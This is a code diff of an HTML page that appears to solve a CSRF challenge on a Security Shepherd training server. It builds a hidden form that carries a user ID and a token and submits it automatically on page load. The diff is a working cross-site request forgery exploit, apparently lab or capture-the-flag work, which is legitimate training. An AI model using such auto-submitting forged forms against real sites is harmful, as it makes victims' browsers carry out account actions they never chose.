@@ -5,8 +5,8 @@
     </head>
 
     <body>
-        <h1>Crazydais - CSR</h1>
-
+        <h1>Crazydais - CSRF</h1>
+        <div id="mycsrf"></div>
         <script>
             (function () {
                 
@@ -22,7 +22,13 @@
                     }
                 }, 3);
 
-                createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
+                var form = createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
+                var div = document.getElementById("mycsrf");
+                div.appendChild(form);
+                
+                var csrfForm = document.getElementById("csrf-form");
+                csrfForm.submit();
+                
             })();
             
             function addInputToForm(form, name, value) {
@@ -36,11 +42,13 @@
             
             function createForm(id, csrf) {
                 var form = document.createElement('form');
+                form.id = "csrf-form";
                 form.action = 'https://shepherd.waratek.lan/user/csrfchallengethree/plusplus';
                 form.method = 'POST';
                 addInputToForm(form, 'userId', id);
                 addInputToForm(form, 'csrfToken', csrf);
-                form.submit();
+                //form.submit();
+                return form;
             }
         </script>
     </body>
